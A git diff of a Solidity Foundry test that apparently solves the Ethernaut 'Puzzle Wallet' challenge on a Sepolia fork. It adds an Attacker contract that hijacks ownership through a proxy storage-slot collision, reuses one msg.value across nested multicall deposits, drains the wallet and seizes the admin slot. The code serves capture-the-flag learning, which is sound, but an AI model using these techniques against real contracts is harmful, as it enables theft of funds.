@@ -14,59 +14,53 @@ interface PuzzleWallet{
     function addToWhitelist(address addr) external;
     function callme() external;
     function multicall(bytes[] calldata data) external payable;
+    function balances(address addr) external view returns (uint256);
+    function execute(address to, uint256 value, bytes calldata data) external payable;
+    function deposit() external payable;
 }
 
 contract Attacker {
-    function attack() public{
+    receive() payable external{
+    }
 
+    function attack(address walletAddress) public payable{
+        PuzzleWallet wallet = PuzzleWallet(walletAddress);
+        uint256 balance = uint256(uint160(address(msg.sender)));
+
+        wallet.proposeNewAdmin(address(this)); // this changes the owner to th attacker, because of storage slot conflict
+
+        wallet.addToWhitelist(address(this));
+
+        uint currBalance = address(wallet).balance;
+
+        require(wallet.whitelisted(address(this)), "PuzzleWalletTest: expect whitelisted");
+
+        bytes[] memory data = new bytes[](3);
+        bytes[] memory mcdata = new bytes[](1);
+        data[0] = abi.encodeWithSignature("deposit()");  // multicall does not change msg.sender and msg.value
+        mcdata[0] = abi.encodeWithSignature("deposit()"); // this allows us to use one msg.value to make multiple deposits
+        data[1] = abi.encodeWithSignature("multicall(bytes[])", mcdata);
+        data[2] = abi.encodeWithSignature("execute(address,uint256,bytes)", address(this), currBalance * 2, ""); // withdraw 2 * msg.value, this makes the wallet.balance to be 0
+        wallet.multicall{value: currBalance}(data); // and finally allows us to call setMaxBalance to set the maxBalance to be the address of the attacker
+
+        wallet.setMaxBalance(balance);
+        payable(msg.sender).transfer(address(this).balance);
     }
 }
 
 contract PuzzleWalletTest is Test {
-
-
     function setUp() public {
-        vm.createSelectFork("sepolia", 5454970);
+        vm.createSelectFork("sepolia", 5460812);
     }
 
-    function test_puzzlewallet() public {
-        bytes32 implSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
-        PuzzleWallet wallet = PuzzleWallet(0x086032F3A5D2D6a57a9eB81050Beb6f07f03D5F9);
-        uint256 balance = uint256(uint160(address(this)));
+    function test_wallet() public {
+        PuzzleWallet wallet = PuzzleWallet(0x22792ea76bcc9AE03D5aA02B48D643e25930a6a9);
+        Attacker attacker = new Attacker();
+        attacker.attack{value: 0.002 ether}(0x22792ea76bcc9AE03D5aA02B48D643e25930a6a9);
 
-        address initAdmin = wallet.admin();
-        console.log("pendingAdmin: %s", wallet.pendingAdmin());
-        console.log("whitelisted: %s", wallet.whitelisted(0x8AC4E3906688EfE71818531a9e439A7ABFDA0154));
-
-        wallet.proposeNewAdmin(address(this));
-
-        // address(wallet).call(abi.encodeWithSignature("callme()"));
-        address impl = 0x7A95ccb0c54415594886a70Aec524B2F31dCF2C3;
-        PuzzleWallet(impl).init(balance);
-
-        require(address(this) == PuzzleWallet(impl).owner(), "PuzzleWalletTest: owner hijack failed");
-
-        // PuzzleWallet(impl).addToWhitelist(address(this));
-        wallet.addToWhitelist(address(this));
-        console.log("maxBalance: %s", wallet.maxBalance());
-
-
-        // wallet.setMaxBalance(balance);
-
-        require(wallet.whitelisted(address(this)), "PuzzleWalletTest: expect whitelisted");
-
-        bytes[] memory data = new bytes[](1);
-        data[0] = abi.encodeWithSignature("proposeNewAdmin(address)", address(this));
-        wallet.multicall(data);
-
-
-        require(wallet.admin() != initAdmin, "PuzzleWalletTest: admin should be changed");
-
+        require(wallet.owner() == address(attacker), "PuzzleWalletTest: owner should be changed");
         require(wallet.admin() == address(this), "PuzzleWalletTest: admin hijack failed");
-
     }
 
-    function callme() public {
-        console.log("callme success");
-    }
+
 }
